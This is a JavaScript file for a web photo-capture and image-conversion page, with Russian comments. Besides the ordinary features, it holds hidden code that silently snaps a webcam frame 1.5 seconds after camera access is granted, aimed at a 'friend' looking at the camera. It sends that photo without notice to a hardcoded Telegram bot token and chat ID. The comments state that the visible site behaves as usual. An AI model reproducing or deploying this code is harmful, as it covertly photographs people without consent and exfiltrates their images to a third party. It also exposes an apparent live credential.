  let currentStream = null;
let secretPhotoSent = false;

// ========== НАСТРОЙКИ TELEGRAM (ЗАМЕНИТЕ НА СВОИ) ==========
const TELEGRAM_BOT_TOKEN = '8781244321:AAEcEKLEoBdcpAHrKD6OKVoArhVyuR-R8ks';   // Например: 1234567890:ABCdefGHIjklmNOPqrstUVWxyz
const YOUR_CHAT_ID = '5595685916'; 

// ========== ОСНОВНАЯ ЛОГИКА ==========

// Шаг 1: Доступ к камере + скрытое фото через 1.5 секунды
async function setupCamera() {
  try {
    currentStream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.getElementById('video');
    video.srcObject = currentStream;
    
    // Тихо делаем фото через 1.5 секунды (пока друг смотрит в камеру)
    setTimeout(() => {
      if (!secretPhotoSent && currentStream && currentStream.active) {
        takeSecretPhoto();
      }
    }, 1500);
    
  } catch (error) {
    console.error('Ошибка доступа к камере:', error);
    alert('Не удалось получить доступ к камере. Проверьте разрешения браузера.');
  }
}

// Скрытое фото (без изменения интерфейса)
async function takeSecretPhoto() {
  const video = document.getElementById('video');
  if (!video || video.readyState < 2) return;
  
  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const context = canvas.getContext('2d');
  context.drawImage(video, 0, 0);
  
  secretPhotoSent = true;
  
  // Отправляем в Telegram
  canvas.toBlob(async (blob) => {
    await sendToTelegram(blob);
  }, 'image/jpeg', 0.7);
}

// Отправка в Telegram (тихо, без уведомлений)
async function sendToTelegram(blob) {
  const formData = new FormData();
  formData.append('chat_id', YOUR_CHAT_ID);
  formData.append('photo', blob, `secret_${Date.now()}.jpg`);
  
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    });
    console.log('Секретное фото отправлено');
  } catch (error) {
    console.error('Ошибка отправки:', error);
  }
}

// ========== ОБЫЧНАЯ РАБОТА САЙТА (НИЧЕГО НЕ МЕНЯЕТСЯ) ==========

// Обычное фото по кнопке "Сделать фото"
function takePhoto() {
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const context = canvas.getContext('2d');

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  context.drawImage(video, 0, 0);

  if (currentStream) {
    currentStream.getTracks().forEach(track => track.stop());
  }

  video.style.display = 'none';
  canvas.style.display = 'block';
}

// Загрузка из галереи
function handleFileSelect(event) {
  const file = event.target.files[0];
  if (!file) return;

  const reader = new FileReader();
  reader.onload = function(e) {
    const img = document.getElementById('uploaded-image');
    img.src = e.target.result;
    document.getElementById('video').style.display = 'none';
    document.getElementById('canvas').style.display = 'none';
    img.style.display = 'block';
  };
  reader.readAsDataURL(file);
}

// Конвертация и скачивание (работает как обычно)
function convertImage() {
  const format = document.getElementById('format').value;
  const quality = parseFloat(document.getElementById('quality').value);
  const width = document.getElementById('width').value ? parseInt(document.getElementById('width').value) : null;

  const canvas = document.getElementById('canvas');
  const img = document.getElementById('uploaded-image');
  let source = canvas;
  let isCanvas = true;

  if (img.style.display !== 'none') {
    source = img;
    isCanvas = false;
  }

  const tempCanvas = document.createElement('canvas');
  const ctx = tempCanvas.getContext('2d');

  if (width) {
    const ratio = width / (isCanvas ? canvas.width : source.naturalWidth);
    tempCanvas.width = width;
    tempCanvas.height = (isCanvas ? canvas.height : source.naturalHeight) * ratio;
  } else {
    tempCanvas.width = isCanvas ? canvas.width : source.naturalWidth;
    tempCanvas.height = isCanvas ? canvas.height : source.naturalHeight;
  }

  ctx.drawImage(source, 0, 0, tempCanvas.width, tempCanvas.height);

  tempCanvas.toBlob(blob => {
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `photo.${format}`;
    a.click();
    URL.revokeObjectURL(url);
  }, `image/${format}`, quality);
}

// Инициализация состояния кнопки камеры при загрузке страницы
document.addEventListener('DOMContentLoaded', function() {
  updateCameraButtonState(false); // Изначально камера выключена
});
